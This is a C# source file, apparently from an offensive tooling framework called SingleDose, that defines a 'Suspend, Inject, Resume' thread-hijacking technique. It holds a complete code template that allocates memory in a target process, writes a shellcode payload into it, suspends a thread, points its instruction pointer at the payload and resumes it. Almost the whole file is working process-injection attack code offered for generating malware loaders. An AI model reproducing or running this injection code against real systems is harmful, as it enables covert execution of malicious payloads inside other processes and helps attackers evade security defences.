using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class SIR : ITechnique
    {
        string ITechnique.TechniqueName => "SIR";

        string ITechnique.TechniqueDescription => "Suspend, Inject, Resume - A form of thread hijacking where the target thread is suspended," +
            "the instruction pointer is set to the location of shellcode, and then the thread is resumed.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/thread-hijack.cs",
            @"https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAllocEx", "WriteProcessMemory_ByteArray", "OpenThread", "SuspendThread",
            "GetThreadContext", "SetThreadContext", "ResumeThread", "CloseHandle" };
        List<string> ITechnique.Prerequisites => new List<string>() { "ProcessID" };
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            Process target = Process.GetProcessById({{PROCESSID}});
            bool bvRet = false;
            IntPtr hAlloc = VirtualAllocEx(target.Handle, IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            if (hAlloc == IntPtr.Zero)
            {
                Console.WriteLine(""VirtualAllocEx: failed to alloc in process. Exiting..."");
                System.Environment.Exit(1);
            }

            IntPtr NumRead = IntPtr.Zero;
            WriteProcessMemory(target.Handle, hAlloc, payload, (uint)payload.Length, out NumRead);
            if (NumRead == IntPtr.Zero)
            {
                Console.WriteLine(""WriteProcessMemory: failed to write to process. Exiting..."");
                System.Environment.Exit(1);
            }

            {{PROTECT}}

            IntPtr hThread = OpenThread(0x0002 | 0x0008 | 0x0010, false, target.Threads[0].Id);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine(""OpenThread: failed to get handle. Exiting..."");
                System.Environment.Exit(1);
            }

            SuspendThread(hThread);

            CONTEXT64 sC64 = new CONTEXT64();
            sC64.ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL;
            IntPtr psC64 = Marshal.AllocHGlobal(Marshal.SizeOf(sC64));
            Marshal.StructureToPtr(sC64, psC64, false);
            bvRet = GetThreadContext(hThread, psC64);
            
            if (!bvRet)
            {
                Console.WriteLine(""GetThreadContext: failed to get CONTEXT. Exiting..."");
                System.Environment.Exit(1);
            }

            sC64 = (CONTEXT64)Marshal.PtrToStructure(psC64, typeof(CONTEXT64));
            sC64.Rip = (ulong)hAlloc.ToInt64();
            Marshal.StructureToPtr(sC64, psC64, false);
            bvRet = SetThreadContext(hThread, psC64);
            if (!bvRet)
            {
                Console.WriteLine(""SetThreadContext: failed to set CONTEXT. Exiting..."");
                System.Environment.Exit(1);
            }

            ResumeThread(hThread);
            CloseHandle(hThread);

        }
        {{ARGS}}
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format(""High:{0}, Low:{1}"", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }
        {{INVOKE}}
    }
}";
        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(target.Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
